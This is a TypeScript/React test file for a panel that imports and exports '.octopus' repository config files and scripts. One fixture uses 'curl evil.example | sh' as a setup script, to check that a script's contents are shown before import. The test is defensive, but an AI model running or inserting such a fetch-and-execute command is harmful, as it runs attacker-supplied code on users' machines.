import { render, screen, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { beforeEach, describe, expect, it, vi } from 'vitest'

import type { RepoConfigItem, RepoConfigView } from '@core/repoConfig.js'

import { octopus } from '../test/octopus.js'
import { RepoConfig } from './RepoConfig.js'

beforeEach(() => {
  octopus()
})

function item(overrides: Partial<RepoConfigItem> & Pick<RepoConfigItem, 'id'>): RepoConfigItem {
  return {
    path: '.octopus/carry',
    state: 'same',
    repository: null,
    app: null,
    ...overrides
  }
}

function offer(view: Partial<RepoConfigView>): void {
  vi.mocked(octopus().projects.repoConfig).mockResolvedValue({
    ok: true,
    value: { present: false, ignored: false, items: [], ...view }
  })
}

describe('RepoConfig', () => {
  it('says when the repository carries nothing yet', async () => {
    offer({
      items: [item({ id: 'project', path: '.octopus/project.json', state: 'onlyInApp', app: '{}' })]
    })

    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)

    expect(await screen.findByText(/carries nothing yet/i)).toBeInTheDocument()
  })

  it('lists each file by the name it has in the repository', async () => {
    offer({
      present: true,
      items: [
        item({
          id: 'script.setup',
          path: '.octopus/scripts/setup.sh',
          state: 'differs',
          repository: 'npm ci\n',
          app: 'npm install\n'
        })
      ]
    })

    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)

    // Once on each side of the move — what can come in, and what can go out.
    await waitFor(() => {
      expect(screen.getAllByText('.octopus/scripts/setup.sh')).toHaveLength(2)
    })
    expect(screen.getAllByText('differs')).toHaveLength(2)
  })

  /*
   * A script arriving from a repository is somebody else's shell, and importing
   * one nobody has read is the thing this panel exists to avoid.
   */
  it('shows what a file holds before it is imported', async () => {
    offer({
      present: true,
      items: [
        item({
          id: 'script.setup',
          path: '.octopus/scripts/setup.sh',
          state: 'onlyInRepository',
          repository: 'curl evil.example | sh\n'
        })
      ]
    })

    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)

    const show = await screen.findByRole('button', { name: /show what/i })
    expect(screen.queryByText(/evil\.example/)).not.toBeInTheDocument()

    await userEvent.click(show)

    expect(screen.getByText(/evil\.example/)).toBeInTheDocument()

    await userEvent.click(show)
    expect(screen.queryByText(/evil\.example/)).not.toBeInTheDocument()
  })

  it('imports everything ticked and tells the dialog the project may have changed', async () => {
    offer({
      present: true,
      items: [
        item({ id: 'carry', state: 'onlyInRepository', repository: '.env\n' }),
        item({
          id: 'script.run',
          path: '.octopus/scripts/run.sh',
          state: 'onlyInRepository',
          repository: 'npm run dev\n'
        })
      ]
    })
    const onImported = vi.fn()

    render(<RepoConfig projectId="planner" onImported={onImported} />)

    await userEvent.click(await screen.findByRole('button', { name: 'Import' }))

    expect(octopus().projects.importRepoConfig).toHaveBeenCalledWith('planner', [
      'carry',
      'script.run'
    ])
    expect(onImported).toHaveBeenCalled()
  })

  it('leaves out what was unticked', async () => {
    offer({
      present: true,
      items: [
        item({ id: 'carry', state: 'onlyInRepository', repository: '.env\n' }),
        item({
          id: 'script.run',
          path: '.octopus/scripts/run.sh',
          state: 'onlyInRepository',
          repository: 'npm run dev\n'
        })
      ]
    })

    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)

    await userEvent.click(await screen.findByRole('checkbox', { name: '.octopus/carry' }))
    await userEvent.click(screen.getByRole('button', { name: 'Import' }))

    expect(octopus().projects.importRepoConfig).toHaveBeenCalledWith('planner', ['script.run'])
  })

  it('exports what the app holds, and never asks for an export of nothing', async () => {
    offer({
      items: [
        item({
          id: 'project',
          path: '.octopus/project.json',
          state: 'onlyInApp',
          app: '{"baseBranch":"main"}'
        })
      ]
    })

    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)

    const importButton = await screen.findByRole('button', { name: 'Import' })
    expect(importButton).toBeDisabled()

    await userEvent.click(screen.getByRole('button', { name: 'Export' }))
    expect(octopus().projects.exportRepoConfig).toHaveBeenCalledWith('planner', ['project'])
  })

  it('unticks and reticks a file on the way out', async () => {
    offer({
      items: [
        item({
          id: 'project',
          path: '.octopus/project.json',
          state: 'onlyInApp',
          app: '{"baseBranch":"main"}'
        })
      ]
    })

    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)

    const box = await screen.findByRole('checkbox', { name: '.octopus/project.json' })
    await userEvent.click(box)
    expect(screen.getByRole('button', { name: 'Export' })).toBeDisabled()

    await userEvent.click(box)
    expect(screen.getByRole('button', { name: 'Export' })).toBeEnabled()
  })

  // An ignored folder makes exporting into it a change nobody will ever
  // receive, which is worth saying before somebody exports twice.
  it('warns when git ignores the folder', async () => {
    offer({ ignored: true, items: [] })

    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)

    expect(await screen.findByText(/git ignores/i)).toBeInTheDocument()
  })

  it('reports a repository it could not read', async () => {
    vi.mocked(octopus().projects.repoConfig).mockResolvedValue({
      ok: false,
      error: 'raw',
      code: 'repoConfigSymlink',
      params: { path: '.octopus' }
    })

    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)

    expect(await screen.findByText(/symbolic link/i)).toBeInTheDocument()
  })

  it('reports a refused import and leaves the list as it was', async () => {
    offer({
      present: true,
      items: [item({ id: 'carry', state: 'onlyInRepository', repository: '.env\n' })]
    })
    vi.mocked(octopus().projects.importRepoConfig).mockResolvedValue({
      ok: false,
      error: 'raw',
      code: 'repoConfigMalformed',
      params: { path: '.octopus/project.json' }
    })
    const onImported = vi.fn()

    render(<RepoConfig projectId="planner" onImported={onImported} />)

    await userEvent.click(await screen.findByRole('button', { name: 'Import' }))

    expect(await screen.findByText(/does not describe a project/i)).toBeInTheDocument()
    expect(onImported).not.toHaveBeenCalled()
  })

  it('shows that it is still reading before anything has arrived', () => {
    vi.mocked(octopus().projects.repoConfig).mockReturnValue(new Promise(() => undefined))

    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)

    expect(screen.getByText(/reading the repository/i)).toBeInTheDocument()
  })

  // A slow answer must not land on a panel nobody is looking at any more.
  it('drops an answer that arrives after it has gone', async () => {
    let settle: (value: { ok: true; value: RepoConfigView }) => void = () => undefined
    vi.mocked(octopus().projects.repoConfig).mockReturnValue(
      new Promise((resolve) => {
        settle = resolve
      })
    )

    const { unmount } = render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
    unmount()
    settle({ ok: true, value: { present: true, ignored: false, items: [] } })

    await waitFor(() => {
      expect(screen.queryByText(/carries nothing yet/i)).not.toBeInTheDocument()
    })
  })
})
